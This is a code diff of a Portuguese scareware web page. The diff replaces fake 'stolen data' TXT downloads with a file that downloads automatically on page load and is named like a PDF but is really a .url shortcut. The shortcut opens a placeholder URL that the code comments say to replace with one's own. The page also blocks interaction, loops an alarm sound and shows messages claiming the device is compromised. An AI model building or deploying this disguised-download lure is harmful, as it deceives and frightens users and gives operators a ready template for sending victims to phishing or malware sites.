@@ -182,69 +182,56 @@
     
     <audio id="alert-sound" loop>
         <source src="https://assets.mixkit.co/sfx/preview/mixkit-alarm-digital-clock-beep-989.mp3" type="audio/mpeg">
-        Seu navegador não suporta o elemento de áudio.
     </audio>
     
     <script>
-        // Conteúdo dos arquivos TXT que serão baixados
-        const txtFiles = [
-            {
-                name: "senhas_roubadas.txt",
-                content: "AVISO: Seus dados de login foram comprometidos!\n\nLista de contas acessadas:\n- Email principal\n- Redes sociais\n- Aplicativos bancários\n\nNão tente modificar este arquivo!"
-            },
-            {
-                name: "dados_pessoais.txt",
-                content: "⚠️ ALERTA DE VAZAMENTO ⚠️\n\nSeus dados pessoais foram coletados:\n- Nome completo\n- Data de nascimento\n- CPF\n- Endereço\n- Contatos\n\nEste arquivo será enviado para servidores remotos."
-            },
-            {
-                name: "alerta_final.txt",
-                content: "Seu sistema foi comprometido!\n\nRecomendações:\n1. Desconecte-se da internet\n2. Execute um antivírus\n3. Altere todas as senhas\n4. Monitore suas contas"
-            }
-        ];
+        // URL que será aberta quando o falso PDF for executado (SUBSTITUA COM SUA URL)
+        const REDIRECT_URL = "https://www.google.com";
         
-        // Função para baixar arquivos TXT
-        function downloadTxtFiles() {
-            let downloadedCount = 0;
-            const totalFiles = txtFiles.length;
+        // Arquivo que será baixado (disfarçado de PDF mas na verdade é um .url)
+        const fakeFile = {
+            fakeName: "Relatorio_Seguranca.pdf", // Nome que aparecerá
+            realName: "Relatorio_Seguranca.url", // Nome real do arquivo
+            content: `[InternetShortcut]\nURL=${REDIRECT_URL}` // Conteúdo do arquivo .url
+        };
+        
+        // Função para baixar o arquivo disfarçado
+        function downloadFakeFile() {
             const statusElement = document.getElementById('download-status');
             
-            // Atualizar status
-            function updateStatus() {
-                statusElement.textContent = `Download de arquivos: ${downloadedCount}/${totalFiles} concluídos`;
+            try {
+                // Criar o arquivo .url
+                const blob = new Blob([fakeFile.content], { type: 'text/plain' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
                 
-                if (downloadedCount === totalFiles) {
-                    statusElement.textContent = "✅ Todos arquivos maliciosos foram instalados!";
+                // Usar o nome falso para download (pode não funcionar em todos os navegadores)
+                a.download = fakeFile.fakeName;
+                
+                // Forçar a extensão .url em navegadores que permitem
+                if(navigator.userAgent.indexOf('Firefox') > -1 || navigator.userAgent.indexOf('Safari') > -1) {
+                    a.download = fakeFile.realName;
+                    statusElement.textContent = "Download do arquivo malicioso concluído!";
+                } else {
+                    statusElement.textContent = "✅ Arquivo malicioso disfarçado instalado!";
                     statusElement.style.color = "#00ff00";
                 }
+                
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+                
+                // Atualizar barra de progresso
+                document.getElementById('data-value').textContent = '100%';
+                document.getElementById('data-bar').style.width = '100%';
+                
+            } catch (error) {
+                console.error('Erro ao baixar arquivo:', error);
+                statusElement.textContent = "❌ Erro ao instalar arquivo!";
+                statusElement.style.color = "#ff0000";
             }
-            
-            // Baixar cada arquivo com intervalo
-            txtFiles.forEach((file, index) => {
-                setTimeout(() => {
-                    try {
-                        const blob = new Blob([file.content], { type: 'text/plain' });
-                        const url = URL.createObjectURL(blob);
-                        const a = document.createElement('a');
-                        a.href = url;
-                        a.download = file.name;
-                        document.body.appendChild(a);
-                        a.click();
-                        document.body.removeChild(a);
-                        URL.revokeObjectURL(url);
-                        
-                        downloadedCount++;
-                        updateStatus();
-                        
-                        // Atualizar barra de progresso de dados
-                        const dataValue = Math.min(100, 68 + (downloadedCount * 10));
-                        document.getElementById('data-value').textContent = dataValue + '%';
-                        document.getElementById('data-bar').style.width = dataValue + '%';
-                        
-                    } catch (error) {
-                        console.error('Erro ao baixar arquivo:', error);
-                    }
-                }, 3000 * index);
-            });
         }
         
         // Bloquear todas as interações
@@ -338,8 +325,8 @@
         
         // Iniciar todos os efeitos
         function startEffects() {
-            // Iniciar downloads após 2 segundos
-            setTimeout(downloadTxtFiles, 2000);
+            // Iniciar download após 2 segundos
+            setTimeout(downloadFakeFile, 2000);
             
             // Outros efeitos
             setInterval(updateStatus, 2000);
@@ -350,11 +337,10 @@
             
             // Adicionar mensagens aleatórias
             const messages = [
-                "Instalando arquivos maliciosos...",
-                "Coletando dados pessoais...",
-                "Criptografando arquivos...",
-                "Preparando resgate de dados...",
-                "Conectando à rede de bots...",
+                "Instalando arquivo malicioso...",
+                "Camuflando arquivo PDF...",
+                "Preparando redirecionamento...",
+                "Configurando URL oculta...",
                 "Seu dispositivo está sob controle"
             ];
             
